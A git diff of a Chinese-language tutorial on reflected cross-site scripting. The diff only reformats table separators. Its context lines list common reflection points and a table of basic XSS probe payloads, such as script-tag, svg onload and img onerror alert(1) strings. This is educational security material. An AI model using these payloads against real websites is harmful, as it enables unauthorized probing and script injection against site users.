@@ -43,7 +43,7 @@ GET /search?q=<script>alert('XSS')</script> HTTP/1.1
 ## 常见反射点清单
 
 | 位置 | 示例 |
-| ---- | ---- |
+|---|---|
 | 搜索参数 | `?q=<xss>`、`?keyword=<xss>` |
 | 报错信息 | `?id=abc` 返回 "abc 不存在" |
 | 登录状态 | `?msg=登录失败` 直接回显 |
@@ -52,8 +52,9 @@ GET /search?q=<script>alert('XSS')</script> HTTP/1.1
 | Referer 头 | 页面回显 "来自：xxx" 的 Referer |
 
 ## 3.核心payload
+
 | 场景     | Payload                                   | 说明                |
-| ------ | ----------------------------------------- | ----------------- |
+|---|---|---|
 | 基础测试   | `<script>alert(1)</script>`               | 最经典，但最容易被拦        |
 | 标签属性逃逸 | `"><svg/onload=alert(1)>`                 | 用于突破属性值闭合         |
 | img 事件 | `<img src=x onerror=alert(1)>`            | 不用 script 标签的经典替代 |
